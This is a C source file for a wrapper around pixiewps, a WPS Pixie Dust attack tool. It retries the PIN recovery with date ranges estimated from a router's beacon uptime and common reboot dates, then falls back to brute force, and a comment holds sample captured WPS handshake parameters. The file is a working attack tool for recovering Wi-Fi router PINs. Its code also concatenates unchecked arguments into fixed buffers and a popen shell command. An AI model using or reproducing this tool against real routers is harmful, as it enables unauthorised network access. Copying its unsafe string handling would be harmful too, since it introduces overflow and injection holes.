/* testdata:
-u $((0xae317ff4f5)) -e d0141b15656e96b85fcead2e8e76330d2b1ac1576bb026e7a328c0e1baf8cf91664371174c08ee12ec92b0519c54879f21255be5a8770e1fa1880470ef423c90e34d7847a6fcb4924563d1af1db0c481ead9852c519bf1dd429c163951cf69181b132aea2a3684caf35bc54aca1b20c88bb3b7339ff7d56e09139d77f0ac58079097938251dbbe75e86715cc6b7c0ca945fa8dd8d661beb73b414032798dadee32b5dd61bf105f18d89217760b75c5d966a5a490472ceba9e3b4224f3d89fb2b -s 2b39e024cf02717b0aa9d355c00d11e663d8dd6419eced2c2d65474d53acbc42 -z 2b39e024cf02717b0aa9d355c00d11e663d8dd6419eced2c2d65474d53acbc42 -a b1d3ea1d7a12f75d097b8d26d2705b5ef25a476dd4aa68c2e764136ab282e89b -n 3f1b09a86baf5fd17bd517121e4dce91 -r 72b17748bc1c08b3c301af1343d26efcf7ac27e8c1fd8add70dce410964ef4dd6d151012893407d9673b38eced0d3141b673393b6785a366b477ec7dca8ead064aa54836ee855faa31fd125195e18ae5e0263175b60589100615d87ab9ac43440287f28bb9719a5c5dab2aec690fb900603de5ce108c1e3adf9dca9eee1d36a09f9d90363996166501934be41002c5a04e0c7ab16ec37251a8456bdae17598f57d481341a69af02b4effc5737c9403de68c6bea16a281352b56a1a114bfd8b9c
 [*] Seed N1:  947432970 (Sun Jan  9 15:49:30 2000 UTC)
*/

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <ctype.h>
#include <time.h>

static int usage(char *a0) {
	printf(	"%s [-u beacon timestamp] pixiewps_parameters\n\n"
		"runs pixiewps in:\n"
		"1) normal mode\n"
		"2) if above failed, several likely timestamps with short interval\n"
		"3) if above failed, with --force\n\n"
		"if env var PIXIEWPS is set, its value will be used as the executable.\n\n"
		"parameter 'u', if used, must be the first command line arg.\n"
		"it shall contain the 64bit uptime timestamp of beacon/probe resp packets\n"
		"sent by the router immediately before the pixiewps attack (in decimal).\n"
		, a0);
	return 1;
}

#define PIXIE_SUCCESS "[+] WPS pin:"
#define PIXIE_VULNERABLE "[!] The AP /might be/ vulnerable"
static int pixie_run(char *pixiecmd, char *pinbuf, size_t *pinlen) {
	int ret = 0;
	FILE *pr = popen(pixiecmd, "r");
	if(pr) {
		char buf[1024], *p;
		while(fgets(buf, sizeof buf, pr)) {
			printf("%s", buf);
			if(ret) continue;
			p = buf;
			while(isspace(*p))++p;
			if(!strncmp(p, PIXIE_SUCCESS, sizeof(PIXIE_SUCCESS)-1)) {
				ret = 1;
				char *pin = p + sizeof(PIXIE_SUCCESS)-1;
				while(isspace(*pin))++pin;
				if(!strncmp(pin, "<empty>", 7)) {
					*pinlen = 0;
					*pinbuf = 0;
				} else {
					char *q = strchr(pin, '\n');
					if(q) *q = 0;
					else {
						fprintf(stderr, "oops1\n");
						ret = 0;
					}
					size_t pl = strlen(pin);
					if(pl < *pinlen) {
						memcpy(pinbuf, pin, pl+1);
						*pinlen = pl;
					} else {
						fprintf(stderr, "oops2\n");
						ret = 0;
					}
				}
			} else if(!strncmp(p, PIXIE_VULNERABLE, sizeof(PIXIE_VULNERABLE)-1)) {
				ret = -1;
			}
		}
		pclose(pr);
	}
	return ret;
}


static void add_beacon_timestamp(int *year, int *month, uint64_t timestamp) {
#define TSTP_SEC 1000000ULL /* 1 MHz clock -> 1 million ticks/sec */
#define TSTP_MIN (TSTP_SEC * 60ULL)
#define TSTP_HOUR (TSTP_MIN * 60ULL)
#define TSTP_DAY (TSTP_HOUR * 24ULL)
	unsigned days = timestamp / TSTP_DAY;
	struct tm tms = {
		.tm_mday = 1,
		.tm_mon = *month - 1,
		.tm_year = *year - 1900
	};
	time_t start = mktime(&tms);
	unsigned secs = days * (24*60*60);
	start += secs;
	struct tm *result = gmtime(&start);
	*year = result->tm_year + 1900;
	*month = result->tm_mon + 1;
}


static const struct date {
	int year;
	int month;
} reboot_dates[] = {
{ 2000, 1},
{ 2015, 1},
{ 2013, 1},
{ 1970, 1},
{0}
};

#ifndef SEARCH_MONTHS
#define SEARCH_MONTHS (uptime == 0 ? 2 : 1)
#endif

#ifndef PIXIE_BIN
#define PIXIE_BIN "pixiewps"
#endif

int main(int argc, char** argv) {
	uint64_t uptime = 0;
	if(argc < 3) return usage(argv[0]);
	int pixie_start_arg = 1, i;
	if(argv[1][0] == '-' && argv[1][1] == 'u' && argv[1][2] == 0) {
		uptime = strtoll(argv[2], 0, 10);
		pixie_start_arg = 3;
	}
	char pixie_args[4096];
	char* pixie_bin = getenv("PIXIEWPS");
	if(!pixie_bin) pixie_bin = PIXIE_BIN;
	strcpy(pixie_args, pixie_bin);
	for(i=pixie_start_arg; i<argc; ++i) {
		strcat(pixie_args, " ");
		strcat(pixie_args, argv[i]);
	}
	char pinbuf[64] = {0};
	size_t pinlen = sizeof(pinbuf);
	int ret = pixie_run(pixie_args, pinbuf, &pinlen);
	if(ret == 1) return 0;
	if(ret == 0) return 1;
	setenv("TZ", "UTC", 1);
	tzset();
	const struct date *date;
	for(date = reboot_dates; date->year; date++) {
		int year = date->year;
		int month = date->month;
		add_beacon_timestamp(&year, &month, uptime);
		char cmd[4096], dstring[128];
		strcpy(cmd, pixie_args);
		sprintf(dstring, " --start %02d/%04d --end %02d/%04d",
			month, year, 1+((month-1+SEARCH_MONTHS)%12), year+((month-1+SEARCH_MONTHS)/12) );
		strcat(cmd, dstring);
		ret = pixie_run(cmd, pinbuf, &pinlen);
		if(ret == 1) return 0;
	}
	strcat(pixie_args, " --force");
	ret = pixie_run(pixie_args, pinbuf, &pinlen);
	if(ret == 1) return 0;
	return 1;
}
